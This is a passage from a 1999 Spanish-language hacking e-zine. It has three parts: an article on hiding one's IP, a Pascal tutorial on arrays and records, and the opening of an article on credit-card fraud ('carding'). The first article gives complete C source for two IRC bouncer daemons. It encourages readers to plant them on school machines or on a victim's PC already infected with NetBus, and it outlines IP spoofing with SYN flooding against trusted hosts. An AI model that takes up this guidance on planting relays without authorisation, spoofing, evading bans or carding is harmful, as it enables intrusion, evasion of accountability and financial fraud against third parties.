	Escape character is '^]'.
	Host: 
	----------------------------------------------------

	Para reconocerlo correctamente FTP

	-------------------------------------------------------
	Connected to 194.75.196.77.
	220 S-Proxy preparado para recibir.
	-------------------------------------------------------

	cuando realizamos telnet solo nos deja hacerlo al puerto 23 lo que 
	aumenta su seguridad pero nos permite Bouncear igualmente :)

Creo que ya sabeis que es lo que se puede hacer con esto.. al hacer un
telnet al wingate podemos saltar a cualquier otra maquina

	Wingate>mi.vecino.es 23

La ventaja es clara... no nos conectamos a la maquina de mi.vecino.es desde
nuestro ordenador si no desde el del wingate quedando en la maquina de
mi.vecino.es la IP del wingate y no la nuestra :P
Pero no todo es tan facil :( en la maquina del wingate pueden quedar los
logs asi que andar con cuidado

4- Bouncer
Como la tecnica explicada en el apartado anterior existe alguna otra manera
de hacer bouncing. Creo que ya entendeis lo que es bouncing pero bueno....

	mi maquina             Bouncer              objetivo
	    A      ---------->    B    ----------->     C

El bouncer puede ser como el caso anterior un wingate mal configurado o un
programa colocado en la maquina B por una mano un tanto "inocente"
Bouncing se puede hacer en maquinas Unix haciendo correr un daemond que
nosotros hallamos colocado (ojo con el root!) solo le indicaremos el puerto
por el que nosotros entraremos y la maquina y puerto al que "saltamos"
Esto se puede usar para conectarse al IRC de forma mas segura o para otros
menesteres ;>
Aqui os dejo un Bouncer para acceder al IRC:

<++> ocultacion_ips/bouncer.c !5080d4f2
/* Distribution: Public */ 
/* Copyright: Held by the respective contributors */ 
/* Posted to USENET September '93 by Mark mark@cairo.anu.edu.au */ 

/* This file was telserv.c, part of the Telnet Server package v. 1.0, 
     written by "Hal-9000". Much of that package was developed by Richard 
     Stephens and his thanks go to "Xanadude" for providing him with that 
     section. Performance fix by Darren Reed. */ 

/* Reworked to add concurrency, password checking and destination selection 
   on the fly. - Mark 31st Aug 93 

   Now its a IRC bouncer - riley Nov 93. 

   Compiled and tested on: 
       HPUX 9.01 9000/700 series        NeXTStep 3.1 NeXT 68040 
    OSx Pyramid 90x BSD universe     SunOS 5.2 sun4c 
    Ultrix 4.3 DEC RISC 

   To compile, type "cc -O -s ts2.c -o ts2". 
*/ 
  

/*+  IRC Bouncer hacks  +*/ 

#define IRCSERV "irc.lleida.net" 
#define IRCPORT 6667 
#define IRCBNC 9999 

#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <sys/time.h> 
#include <sys/resource.h> 
#include <sys/wait.h> 
#include <fcntl.h> 
#include <errno.h> 
#include <netinet/in.h> 
#include <netdb.h> 
#include <arpa/inet.h> 
#include <sys/ioctl.h> 

#define    QLEN           5 

char sbuf[2048], cbuf[2048]; 
extern int errno; 
extern char *sys_errlist[]; 
void reaper(); 
int main(); 
void telcli(); 

int main(argc, argv) 
int argc; 
char *argv[]; 
{ 
    int srv_fd, rem_fd, rem_len, opt = 1; 
    struct sockaddr_in rem_addr, srv_addr; 
#if !defined(SVR4) && !defined(POSIX) && !defined(linux) && !defined(__386BSD__) && !defined(hpux) 
    union wait status; 
#else 
    int    status; 
#endif /* !defined(SVR4) */ 

    bzero((char *) &rem_addr, sizeof(rem_addr)); 
    bzero((char *) &srv_addr, sizeof(srv_addr)); 
    srv_addr.sin_family = AF_INET; 
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
    srv_addr.sin_port = htons(IRCBNC);  /*+ IRC Bouncer hack  +*/ 
    srv_fd = socket(PF_INET, SOCK_STREAM, 0); 
    if (bind(srv_fd, (struct sockaddr *) &srv_addr, sizeof(srv_addr)) == -1) { 
        perror("bind"); 
        exit(-1); 
    } 
    listen(srv_fd, QLEN); 
    close(0); close(1); close(2); 
#ifdef TIOCNOTTY 
    if ((rem_fd = open("/dev/tty", O_RDWR)) >= 0) { 
        ioctl(rem_fd, TIOCNOTTY, (char *)0); 
        close(rem_fd); 
    } 
#endif 
    if (fork()) exit(0); 
    while (1) { 
    rem_len = sizeof(rem_addr); 
        rem_fd=accept(srv_fd, (struct sockaddr *) &rem_addr, &rem_len); 
        if (rem_fd < 0) { 
            if (errno == EINTR) continue; 
            exit(-1); 
        } 
        switch(fork()) { 
        case 0:                             /* child process */ 
            close(srv_fd);                  /* close original socket */ 
            telcli(rem_fd);                 /* process the request */ 
            close(rem_fd); 
            exit(0); 
            break; 
        default: 
            close(rem_fd);                  /* parent process */ 
            if (fork()) exit(0);            /* let init worry about children */ 
            break; 
        case -1: 
            fprintf(stderr, "\n\rfork: %s\n\r", sys_errlist[errno]); 
            break; 
        } 
    } 
} 

void telcli(source) 
int source; 
{ 
    int dest; 
    int found; 
    struct sockaddr_in sa; 
    struct hostent *hp; 
    struct servent *sp; 
    char gethost[100]; 
    char getport[100]; 
    char string[100]; 

        hp = gethostbyname(IRCSERV); 
        if (hp) { 
            found++; 
#if !defined(h_addr)        /* In 4.3, this is a #define */ 
#if defined(hpux) || defined(NeXT) || defined(ultrix) || defined(POSIX) 
            memcpy((caddr_t)&sa.sin_addr, hp->h_addr_list[0], hp->h_length); 
#else 
            bcopy(hp->h_addr_list[0], &sa.sin_addr, hp->h_length); 
#endif 
#else /* defined(h_addr) */ 
#if defined(hpux) || defined(NeXT) || defined(ultrix) || defined(POSIX) 
            memcpy((caddr_t)&sa.sin_addr, hp->h_addr, hp->h_length); 
#else 
            bcopy(hp->h_addr, &sa.sin_addr, hp->h_length); 
#endif 
#endif /* defined(h_addr) */ 
        } else { 
            if (inet_addr(gethost) == -1) { 
                found = 0; 
                sprintf(string, "Didnt find address for %s\r\n", gethost); 
                write(source, string, strlen(string)); 
            } else { 
                found++; 
                sa.sin_addr.s_addr = inet_addr(gethost); 
            } 
        } 
    sa.sin_family = AF_INET; 
    sa.sin_port = htons((unsigned) IRCPORT); 
    if (sa.sin_port == 0) { 
        sp = getservbyname(getport, "tcp"); 
        if (sp) 
            sa.sin_port = sp->s_port; 
        else { 
            sprintf(string, "%s: bad port number\r\n", getport); 
            write(source, string, strlen(string)); 
            return; 
        } 
    } 
    if ((dest = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
        perror("telcli: socket"); 
        exit(1); 
    } 
    connect(dest, (struct sockaddr *) &sa, sizeof(sa)); 
#ifdef FNDELAY 
    fcntl(source,F_SETFL,fcntl(source,F_GETFL,0)|FNDELAY); 
    fcntl(dest,F_SETFL,fcntl(dest,F_GETFL,0)|FNDELAY); 
#else 
    fcntl(source,F_SETFL,O_NDELAY); 
    fcntl(dest,F_SETFL,O_NDELAY); 
#endif 
    communicate(dest,source); 
    close(dest); 
    exit(0); 
} 

communicate(sfd,cfd)    { 
    char *chead, *ctail, *shead, *stail; 
    int num, nfd, spos, cpos; 
    extern int errno; 
    fd_set rd, wr; 

    chead = ctail = cbuf; 
    cpos = 0; 
    shead = stail = sbuf; 
    spos = 0; 
    while (1) { 
        FD_ZERO(&rd); 
        FD_ZERO(&wr); 
        if (spos < sizeof(sbuf)-1) FD_SET(sfd, &rd); 
        if (ctail > chead) FD_SET(sfd, &wr); 
        if (cpos < sizeof(cbuf)-1) FD_SET(cfd, &rd); 
        if (stail > shead) FD_SET(cfd, &wr); 
        nfd = select(256, &rd, &wr, 0, 0); 
        if (nfd <= 0) continue; 
        if (FD_ISSET(sfd, &rd)) { 
            num=read(sfd,stail,sizeof(sbuf)-spos); 
            if ((num==-1) && (errno != EWOULDBLOCK)) return; 
            if (num==0) return; 
            if (num>0) { 
                spos += num; 
                stail += num; 
                if (!--nfd) continue; 
            } 
        } 
        if (FD_ISSET(cfd, &rd)) { 
            num=read(cfd,ctail,sizeof(cbuf)-cpos); 
            if ((num==-1) && (errno != EWOULDBLOCK)) return; 
            if (num==0) return; 
            if (num>0) { 
                cpos += num; 
                ctail += num; 
                if (!--nfd) continue; 
            } 
        } 
        if (FD_ISSET(sfd, &wr)) { 
            num=write(sfd,chead,ctail-chead); 
            if ((num==-1) && (errno != EWOULDBLOCK)) return; 
            if (num>0) { 
                chead += num; 
                if (chead == ctail) { 
                    chead = ctail = cbuf; 
                    cpos = 0; 
                } 
                if (!--nfd) continue; 
            } 
        } 
        if (FD_ISSET(cfd, &wr)) { 
            num=write(cfd,shead,stail-shead); 
            if ((num==-1) && (errno != EWOULDBLOCK)) return; 
            if (num>0) { 
                shead += num; 
                if (shead == stail) { 
                    shead = stail = sbuf; 
                    spos = 0; 
                } 
                if (!--nfd) continue; 
            } 
        } 
    } 
} 
<-->

tambien os dejo otro Bouncer con acceso atraves de una pass, para que ningun
listillo se aproveche de vuestro trabajo colocando un Bouncer y usandolo el.

<++> ocultacion_ips/bouncer2.c !486e1740
/* Virtual Hostname/Machine IRC Bouncer 
   *** Includes: 
  -choose any irc server after connect! 
  -virtual hostnames...duh! 
  -password protected after connnect. 
   *** Future Plans: To make it so it allows more than one connect. 
       */ 
/* INSTRUCTIONS FOR USE: First, type export IRC_HOST=your.irc.host 
   Next, Type ./vhost <port num>  eg. ./vhost 9090 */ 

/* DEFINES */ 
#define password "darkk" 

#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <sys/time.h> 
#include <sys/wait.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <errno.h> 
#include <netdb.h> 
extern h_errno; 

/* SunOS 4.1.4 is really lame and doesn't define this */ 

#ifndef INADDR_NONE 
 #define INADDR_NONE -1 
#endif 

struct  in_addr LocalHostAddr; 

/* m_strdup stolen from ircII epic */ 
/* changed to default malloc instead of ircII epic's new_malloc routine */ 
/* Hope it doesn't create any adverse affects */ 

char    *m_strdup (const char *str) 
{ 
 char *ptr; 
 char empty_string[] = ""; 

 if (!str) 
  str = empty_string; 
 ptr = (char *)malloc(strlen(str) + 1); 
 return strcpy(ptr, str); 
} 

int do_connect(char *hostname, u_short port) 
{ 
 int s = -1; 
 struct hostent *he; 
 struct sockaddr_in sin; 
 struct sockaddr_in localaddr; 

 s = socket(AF_INET, SOCK_STREAM, 0); 
 if(s < 0) 
  return -2; 

/* bind to the local address, this was a pain in the ass to understand */ 

 memset(&localaddr, 0, sizeof(struct sockaddr_in)); 
 localaddr.sin_family = AF_INET; 
 localaddr.sin_addr = LocalHostAddr; 
 localaddr.sin_port = 0; 
 if (bind(s, (struct sockaddr *)&localaddr, sizeof(localaddr))) 
 return close(s), -2; 

/* now connect from the address.. fun for the entire family. */ 

 memset(&sin, 0, sizeof(struct sockaddr_in)); 
 sin.sin_family = AF_INET; 
 sin.sin_port = htons(port); 
 sin.sin_addr.s_addr = inet_addr(hostname); 
 if(sin.sin_addr.s_addr == INADDR_NONE) 
 { 
  he = gethostbyname(hostname); 
  if(!he) 
   return -1; 
  memcpy(&sin.sin_addr, he->h_addr, he->h_length); 
 } 

 if(connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) 
 { 
  close(s); 
  return -2; 
 } 
 return s; 
} 

void server(int s) 
{ 
 int sock_c=-1; 
 int maxfd = s+1; 
 char buffer[1024]; 
 char user[1024]; 
 char nick[1024]; 
 fd_set rset; 
 u_short myport; 
 char *cmd, *server, *port, *passwd; 
 char myserver[1024]; 

 memset(buffer, 0, 1023); 
 if(read(s, buffer, 1024) <= 0) 
 { 
  close(s); 
  return; 
 } 
 if(!strncmp(buffer, "USER", 4)) 
  strcpy(user, buffer); 
 else 
  strcpy(nick, buffer); 
 memset(buffer, 0, 1024); 
 if(read(s, buffer, 1023) <= 0) 
 { 
  close(s); 
  return; 
 } 
 if(!strncmp(buffer, "USER", 4)) 
  strcpy(user, buffer); 
 else 
  strcpy(nick, buffer); 
 sprintf(buffer, "NOTICE usr :****************************************\n"); 
 sprintf(buffer, "NOTICE usr :*  Welcome To Virtual IRC GateWay      *\n"); 
 sprintf(buffer, "NOTICE usr :****************************************\n"); 
 sprintf(buffer, "NOTICE usr : Enter your password....\n"); 
 sprintf(buffer, "NOTICE usr : e.g. /quote connect mypasswd irc.nwlink.com\n"); 
 write(s, buffer, strlen(buffer)); 
 while(1) 
 { 
  FD_ZERO(&rset); 
  FD_SET(s, &rset); 
  if(sock_c >= 0) 
   FD_SET(sock_c, &rset); 
  if(sock_c > s) 
   maxfd = sock_c + 1; 
  else 
   maxfd = s + 1; 
  select(maxfd, &rset, NULL, NULL, NULL); 
  memset(buffer, 0, 1024); 
  if(FD_ISSET(s, &rset)) 
  { 
   if(read(s, buffer, 1023) <= 0) 
   { 
    close(s); 
    close(sock_c); 
    return; 
   } 
   if(sock_c >= 0) 
   { 
    write(sock_c, buffer, strlen(buffer)); 
   } 
   else 
   { 
    cmd = NULL; 
    server = NULL; 
    port = NULL; 
    passwd = NULL; 
    cmd = strtok(buffer, " "); 
    if(!cmd) 
     continue; 
    if(strcmp(cmd, "connect")) 
     continue; 
    passwd = strtok(NULL, " \n\r"); 
    if(!passwd) 
     continue; 
    if((strcmp(passwd, password) != 0)) 
    { 
     sprintf(buffer, "NOTICE usr :*** Password Invalid. UNAUTHORIZED ACCESS IS PROHIBITED \n"); 
     write(s, buffer, strlen(buffer)); 
     continue; 
    } 

    server = strtok(NULL, " \n\r"); 
    if(!server) 
     continue; 
    strcpy(myserver, server); 
    port = strtok(NULL, " \n\r"); 
    if(!port) 
     port = "6667"; 
    myport = atoi(port); 
    sock_c = do_connect(myserver, myport); 
    if(sock_c < 0) 
     sock_c = -1; 
    write(sock_c, user, strlen(user)); 
    write(sock_c, nick, strlen(nick)); 
    memset(buffer, 0, 1024); 
    read(sock_c, buffer, 1023); 
    if(strlen(buffer) > 0) 
    { 
     write(s, buffer, strlen(buffer)); 
    } 
    continue; 
   } 
  } 
  if(sock_c >= 0) 
  { 
   if(FD_ISSET(sock_c, &rset)) 
   { 
    memset(buffer, 0, 1024); 
    if(read(sock_c, buffer, 1023) <= 0) 
    { 
     close(s); 
     close(sock_c); 
     return; 
    } 
    write(s, buffer, strlen(buffer)); 
   } 
  } 
 } 
} 
  

int 
main(int argc, char *argv[]) 
{ 
 int a_sock = 0; 
 int s_sock = 0; 
 char    *LocalHostName = NULL; 
 char    *ptr = NULL; 
 char hostname[81]; 
 struct hostent * hp; 
 int dport; 
 struct sockaddr_in sin; 
 int sinlen; 
 int xx; 
 int mypid; 
 if(argc >= 2) dport=atoi(argv[1]); else dport=9090; 
 if ((ptr = getenv("IRC_HOST")) || (ptr = getenv("IRCHOST"))) 
  LocalHostName = m_strdup(ptr); 
 if ((gethostname(hostname, sizeof(hostname)))) 
  if (!LocalHostName) 
   exit(1); 
 printf("Virtual host ircgate, *hop* Hold on..\n"); 
 printf("Attempting to bind on port: %d\n",dport); 

 if (LocalHostName) 
 { 
  printf("Attempting to bind on host: %s\n", LocalHostName); 
  memset((void *)&LocalHostAddr, 0, sizeof(LocalHostAddr)); 
  if ((hp = gethostbyname(LocalHostName))) 
   memcpy((void *)&LocalHostAddr, hp->h_addr, sizeof(LocalHostAddr)); 
 } 
 else 
 { 
  if ((hp = gethostbyname(hostname))) 
   memcpy((char *) &LocalHostAddr, hp->h_addr, sizeof(LocalHostAddr)); 
 } 

 s_sock = socket(AF_INET, SOCK_STREAM, 0); 
 if(s_sock < 0) 
 { 
  perror("socket"); 
  exit(0); 
 } 
 memset(&sin, 0, sizeof(struct sockaddr_in)); 
 sin.sin_family = AF_INET; 
 sin.sin_port = htons(dport); 
 sin.sin_addr.s_addr = INADDR_ANY; 
 if(bind(s_sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) < 0) 
 { 
  perror("bind"); 
  exit(0); 
 } 
  if(listen(s_sock, 10) < 0) 
 { 
  perror("listen"); 
  exit(0); 
 } 
 { 
 xx = fork(); /* Fork the process */ 

 if (xx == -1) { 
  printf("FATAL ERROR: UNABLE TO FORK PROCESS!\n"); 
  exit(1); 
 } 
 if (xx!=0) { 
   printf("Launched into the background [pid: %d]\n\n",xx); 
   setpgid(xx,xx); 
   exit(0); 
 } 
 setpgid(0,0); 
 /* No more TTY i/o for us! */ 
  freopen("/dev/null","r",stdin); 
   freopen("/dev/null","w",stdout); 
    freopen("/dev/null","w",stderr); 

     while(1) 
      { 
  

  sinlen = sizeof(sin); 
  close(a_sock); 
  a_sock = accept(s_sock, (struct sockaddr *)&sin, &sinlen); 
  if(a_sock < 0) 
  { 
   perror("accept"); 
   continue; 
  } 
#ifdef MULTIPLE_OCCURANCES 
  switch(fork()) 
  { 
   case -1: 
    continue; 
   case 0: 
#endif 
    server(a_sock); 
#ifdef MULTIPLE_OCCURANCES 
    exit(0); 
  } 
  /* Might want to set the last param to WNOHANG if it 
     hangs here... Careful, creates zombies if you do. */ 
  while(waitpid(-1, NULL, NULL) > 0) ; 
#endif 
 } 
} 
} 
<-->

Para los usuarios Win y que no tengan una maquina Unix donde colocar estos
programas deciros que existen distintos programas Win para hacer Bouncer,
muchos de ellos los traen los scripts de IRC como el WANIRC del 7th sphere
explicado por Qva$aR en su txt "como saltarse una k-line" en
http://www.undersec.com o el famoso y conocido IRCap de GSi que incorpora un
bouncer hecho por el (los que sepais algo de scripting podeis mirar y
haceros uno a vuestro gusto). Existen mas programas de este tipo como el
WinBouncer muy faciles de configurar y que podeis usar para cualquier cosa
solo teneis que indicar los puertos y el host
Muchos direis que como utilizo yo un Bouncer si no tengo ninguna shell y
solo el PC de mi habitacion... pues para saltarse bans o jugar en el IRC
podeis hacerlo con algun inconsciente amiguete que os deje usar su ip :)
Si sois algo mas avispados o quereis hacer cosas mas interesantes en el
hacking podeis colocarlo en ordenatas de vuestro instituto, en la academia
donde estudiais, a ese pardillo que el otro dia a la noche estaba infectado
con el netbus etc etc ...


5- IP-Spoofing
Bueno llegamos a la parte mas dificil del texto seguro que la mayoria de
vosotros habeis oido hablar de esta tecnica o teneis idea de en que consiste
pero no lo teneis muy claro. Veamos el IP-Spoofing es una tecnica bastante
dificil y compleja que requiere bastantes conocimientos sobre todo del
protocolo TCP-IP
Explicandolo a la ligera podria decir que el IP-Spoofing consiste en enga¤ar
a una maquina (host A) haciendole creer que somos otra maquina (host B) que
en realidad no somos

                              acceso
                     host B  ------->  host A
                             sin pass

Esta tecnica se basa en el procedimiento usado (mal usado) en algunos
sistemas de permitir el acceso sin una comprobacion atraves de contrase¤a y
utilizando la confianza en las direcciones IP
El server A tiene depositada confianza en el server B (trust host), conoce
la IP de este y no pide contrase¤a de entrada a su sistema desde esa maquina
Supongo que ya ireis cogiendo la idea no??? Para realizar esta tecnica es
necesario tener privilegios de Root desde la maquina que se realiza el
ataque. Ademas hay que tener encuenta una cosa que os puede pasar y que es
muy importante, cuando vosotros realizais el ataque modificais los paquetes
de datos cambiando en estos vuestra direccion IP y usando la del Trust host
(esto no se hace "a mano" lo realiza un software especifico para esta tarea,
seguid leyendo) debido a esto las respuestas que la maquina objetivo mande a
esa transmision TCP-IP no las recibireis vosotros sino el trust host pero no
os preocupeis por esto porque seran ignoradas al no haber el realizado la
conexion. El problema viene de que teneis que intuir las respuestas que
manda y tb el tiempo para realizar el siguiente envio de datos esto
dependera de la pericia de cada uno de vosotros :(
Habia pensado incluir el codigo de un programa de IP-spoofing pero os lo
dejo para vosotros porque la mayoria son mas grandes que todo este txt, de
todas maneras en http://www.rootshell.org/ podeis encontrar cientos y para
multitud de sistemas operativos, solo buscad por la palabra "spoof" XD
Otro de los problemas con lo que os encontrareis es localizar el Trust host
de la maquina que quereis atacar (si es que lo tiene!) y el momento de
realizar el ataque porque si entre las dos maquinas estan realizando una
comunicacion es imposible que vosotros os coleis en medio. Lo que debeis de
hacer es cortar el trafico del trust host y asi poder realizar vosotros la
conexion, esto se puede hacer de distintas maneras, procurad que no cante
mucho, mirar cosas del protocolo TCP-IP,(TCP SYN flooding puede ser buena
manera)
Una vez que tengais controlado todo el proceso es decir tengais la maquina
objetivo el trust host y os hallais asegurado que esta no reciba trafico
TCP-IP
Procedeis al ataque IP-Spoofing pero recordar que no recibireis respuestas
por parte de la maquina objetivo.
Bueno comentaros tambien la existencia de algun programa para Win 95/98 que
utilizan su propio conjunto de instrucciones TCP (no el paquete de Win)
realizan Ip-Spoofing uno de estos programas es el Aggressor Exploid, lo
podeis encontrar en http://www.aggressor.net con este programa ademas de
spoofear vuestra Ip tambien podreis realizar otros ataques :P pero sin tener
relacion con lo que explique del Trust host que es la principal aplicacion
del IP-Spoofing
Existen otros programas que tambien spoofea la IP pero de dudosa efectividad
y casi todos orientados al IRC "cambian" vuestra IP y hasta el nombre de
vuestro host (similar al DNS-inject) estos programas son como un Bouncer
pero sin la necesidad de usar una maquina puente con el server de IRC
(dificil de realizar no?? al menos el cambio de IP desde Win)
Con el DNS-inject conseguis que en vez de conectaros asi:

	*** LuKaS (~lukas@ctv21225137015.ctv.es) has joined #sexo

saldria esto otro

	*** LuKaS (~lukas@mi.polla.es.la.mas.grande) has joined #sexo

mola??? :) algunos programas consiguen esto ultimo solo sin spoofear vuestra
IP, otros hacen las dos cosas, hay muchas posibilidades, estos programas
orientados al spoof en el IRC suelen venir en scripts asi que ya sabeis, si
quereis provar si de verdad funcionan.....
downdload RLz!


-------------------------------------------------------------------------
Todo lo explicado en este texto es con fines educativos, el autor no es
responsable del mal uso de lo que aqui se cuenta.
Este txt es de libre distribucion siempre que no se altere su contenido ni
formato asi como el nombre de su autor
Agradecimientos a M|Gel,Craig,aptc,y los que me dejo, por aguantarme :)
Para cualquier duda, sugerencia, critica...... 
Buscame en el IRC-Hispano.org (www.irc-hispano.org) mi nick es Aule tb por
mail a aule@mixmail.com
-------------------------------------------------------------------------

Open your eyes! Open your mind!!
By Aule (c) 1999


=[00110b]=====================================================================
=[Curso de programacion en Pascal (III)]======================================
=[por Freed0m]================================================================


CURSO DE PROGRAMACION EN PASCAL ( III )
---------------------------------------
<By FREED0M>|----------------------------------------------------------------
------------ 
  En esta entrega del curso de programacion en pascal he decidido introduciros 
en el tema de las estructuras compuestas de datos, en la primera entrega se 
hablo de los tipos de datos que contempla pascal, estos datos se pueden 
agrupar en estructuras mas complejas y con estas llevar a cabo una mejor 
gestion de los mismos, asi como crear una mayor similitud de los datos con 
un entorno mas real, ( es en parte una peque¤a orientacion a lo que seria la 
programacion orientada a objetos, aunque no sea pascal un lenguaje orientado 
a ello, seria delphi la herramienta que podriamos denominar "object pascal"), 
bueno me dejo de rollos, y vamos al grano. 
 
--<Los ARRAYS>----------------------------------------------------------------- 
 
        Un array es una estructura de datos lineal, en la que todos sus 
        elementos son del mismo tipo, no pueden ser de tipos distintos. 
        A continuacion un ejemplo de como se declararia un array y algunas 
        operaciones sobre arrays. 
 
        Ej: 
          Program practicas_con_arrays; 
 
          CONST {Declaramos las constantes que compreden el subrango 
                del array, valores de 0 a 10, es decir 11 elementos} 
                MIN=0; 
                MAX=10; 
 
          TYPE {Declaracion de tipos que vamos a emplear para nuestro 
                programa} 
 
                TIPO_INDICE=MIN..MAX; 
                {este tipo indica un subrango de MIN a MAX, es decir 
                todas las variables de tipo indice no podran tomar 
                valores que no esten comprendidos entre MIN y MAX} 
 
                TIPO_ARRAY_NUMEROS=ARRAY[TIPO_INDICE] OF INTEGER; 
                {Este tipo comprende un array de 11 posiciones en cada 
                una de las cuales se almacena un numero entero} 
          VAR 
                NUESTRO_ARRAY:TIPO_ARRAY_NUMEROS; 
                I:TIPO_INDICE; 
                CONTADOR:INTEGER; 
          BEGIN{Comienzo del programa principal} 
                CONTADOR:=0; 
                FOR I:=MIN TO MAX DO 
                    NUESTRO_ARRAY[I]:=5; 
 
                FOR I:=MIN TO MAX DO 
                    IF NUESTRO_ARRAY[I]=5 THEN 
                     CONTADOR:=CONTADOR+1; 
                WRITELN('El numero de cincos en el array es de: ',CONTADOR); 
           END.{Fin del programa principal} 
 
Los arrays pueden tener varias dimensiones, es lo que se denomina arrays 
bidimensionales, tridimensionales, etc... 
 
        Ej: en este ejemplo trataremos un array bidimensional. 
 
            Program array_bidimensional; 
 
            CONST 
                MIN=1; 
                MAX=5; 
            TYPE              
                TIPO_INDICE=MIN..MAX; 
                ARRAY_BIDIMENSIONAL=ARRAY[TIPO_INDICE,TIPO_INDICE] OF STRING; 
              { Definimos array_bidimensional como un array de dos dimensiones 
                en las que cada uno de sus indices es de tipo indice, y cada 
                una de sus componentes es de tipo string, podriamos entender 
                el concepto como una matriz de 2*2} 
             VAR 
                I,J:TIPO_INDICE; 
                MATRIZ:ARRAY_BIDIMENSIONAL; 
             BEGIN{Comienzo del programa principal} 
 
                 FOR I:=MIN TO MAX DO 
                     FOR J:=MIN TO MAX DO 
                        WRITELN(MATRIZ[I,J]); 
             END.{Fin del programa principal} 
 
             {Con este procedimiento iriamos recoriendo posicion a posicion 
              todos los elementos de la matriz 
              Traza: Para I=1 -> J=1, J=2, J=3, J=4, J=5; 
                     Para I=2 -> J=1, J=2, J=3, J=4, J=5; 
                     etc.. 
              Es decir se recorren (1,1), (1,2), (1,3), etc... 
               } 
 
--<Los REGISTROS>-------------------------------------------------------------- 
 
        El otro tipo de datos compuestos que incorpora pascal son los de la 
        estructura RECORD, es decir registro, esto nos permite crear variables 
        en las que los datos no tengan que ser todos del mismo tipo. 
        Como regla nemotecnica podemos pensar que un tipo de registro son los 
        datos que se almacenan en nuestro DNI (saludos mig), ya que son datos 
        de todo tipo, cadenas de texto, numeros, etc... 
        Ej: 
           TYPE 
                TIPO_DNI= RECORD 
                                NOMBRE:STRING; 
                                APELLIDOS:STRING; 
                                DIRECCION:STRING; 
                                FECHA_NACIMIENTO:TIPO_FECHA; 
                                DNI:REAL; 
                                TLF:REAL; 
                           END;{El tipo RECORD no lleva begin pero si un end 
                                para indicar el fin del registro} 
         Para acceder a los distintos campos del registro deberemos indicar 
         con un "." a continuacion del nombre de la variable registro el 
         nombre del campo. 
 
         Ej: 
                VAR 
                    FREED0M:TIPO_DNI; 
                BEGIN 
                     Writeln(FREED0M.DNI); 
                END; 
 
          En el caso de que queramos sacar por pantalla podemos emplear dos  
          metodos. 
          Primero: 
                Writeln(FREED0M.NOMBRE); 
                Writeln(FREED0M.APELLIDOS); 
                Writeln(FREED0M.DIRECCION); 
                Writeln(FREED0M.FECHA_NACIMIENTO); 
                Writeln(FREED0M.DNI); 
                Writeln(FREED0M.TLF); 
          Segundo: ( Este es el metodo optimo ya que nos ahorramos un codigo 
          reduntante, y damos claridad al codigo). 
                WITH FREED0M DO 
                        Writeln(NOMBRE); 
                        Writeln(APELLIDOS); 
                        Writeln(DIRECCION); 
                        Writeln(FECHA_NACIMIENTO); 
                        Writeln(DNI); 
                        Writeln(TLF); 
                 END;{Fin del WITH} 
                 
Podemos crear registros de registros, es decir, que algunos campos de nuestro 
registros sean a su vez tambien registros. 
 
Los arrays y los registros se pueden combinar, pudiendo tener, arrays de 
registros, y registros de arrays. 
 
FREED0M 24-09-99 
 
--------------------------------------------------------------- 
FREED0M is a member of UNDERSEC / NGS TEAM 
ICQ. #32438578          Key ID: 0x167A9E0A 
freedom@undersec.com 
http://www.undersec.com 
--------------------------------------------------------------- 
 

=[00111b]=====================================================================
=[Secure Carding]=============================================================
=[por GamerX]=================================================================


SECURE CARDING by GamerX 
 
Muy buenas a todos. Antes de empezar deciros que este artículo está destinado a 
enseñaros lo que se puede y lo que no se debe hacer con el carding . Recuerda  
que esta práctica está perseguida por la ley y está expuesta a que te metas en  
un lío grandecillo. Espero que os sea útil (a quién no se le ha caído la baba  
con el portatil y el "generador mágico" de tarjetas de crédito de John Connor  
en sus tiempos de adolescente? xD). Cómo es habitual en este tipo de artículos, 
os diré lo típico, pero que nunca está de más: usad esta información sólo para  
ampliar vuestros conocimientos, experimentar, solventar vuestras dudas, etc.  
etc., así que si lo que pensáis hacer cuando acabéis de leer esto es hacer el  
"fraude" perfecto vais finos. Empezaremos con un poquito de historia. Hace  
muuuucho tiempo, digamos en los principios de la etapa de expansión de 
Internet, alguien tuvo la brillante idea de que esta red podría ser un buen  
negocio. Los bancos más importantes y empresas privadas cómo VISA y MasterCard  
montaron varios servidorcillos con los algoritmos de las tarjetas que  
verificaba los números y la fecha de caducidad en las transacciones de todas  
esas empresas que querían vender sus productos mediante un método prometedor.  
Pero no es oro todo lo que reluce... Se tuvo demasiada confianza en este  
algoritmo, se descubrió y los primeros generadores de tarjetas de crédito  
aparecieron. Y no sólo eso, los datos eran transmitidos como si fueran paquetes 
normales y se podían usar sniffers para pillarse los datos del pobre usuario.  
Todo para el mismo fin: obtener el atraco perfecto; ni cámaras, ni vigilantes  
jurados, ideal para gastar todo lo que uno quiera ilimitadamente, es decir,  
bartolas a saco, ordenadores gratis en casa, software en un par de clicks...  
Esta época dorada duró menos de lo que debió, almenos para toda esta gente que  
quería dinero fácil. Aparecieron los primeros sistemas de seguridad, SSL  
(Secure Sockets Layer, para los no iniciados), un sistema de transacción de  
datos directa entre cliente y servidor para evitar posibles intromisiones y se  
ha ido perfeccionando estos años hasta llegar al actual y eficiente SSL3, usado 
en la gran mayoría de transacciones que se hacen cada dia. Para solucionar el  
problema de los algoritmos se introdució la verificación de titular, ya que si  
los datos de este eran incorrectos, la cantidad no podía ser cobrada, es decir, 
que hasta entonces con un simple generador y probando fechas de caducidad ya se 
podía hacer fraude. Hasta la fecha se han ido perfeccionando estos sistemas de  
verificación de autenticidad de datos: verificación de ciudad, de prefijo  
telefónico, de autenticidad de código postal, etc.  
 
Vayamos al grano con un ejemplo para ver el funcionamiento de esto: estamos en  
1999 y vemos una página llamada sex.com (un ejemplo como cualquier otro). La  
pantalla inicial nos parece sugerente, así que le damos al botoncito de  
"Join Now!" preguntándonos si debe ser gratis... Pero no, resulta que nos pasa  
a la página de "Dish SSL3 Systems" y se nos presenta un formulario. Hasta aquí  
deducimos que sex.com ha contratado los eficientes servicios de "Dish SSL3  
Systems", es decir, que a partir de ahora tenemos que tener en cuenta que la  
facturación la llevará Dish, por lo tanto hay que tener más cuidado, ya que  
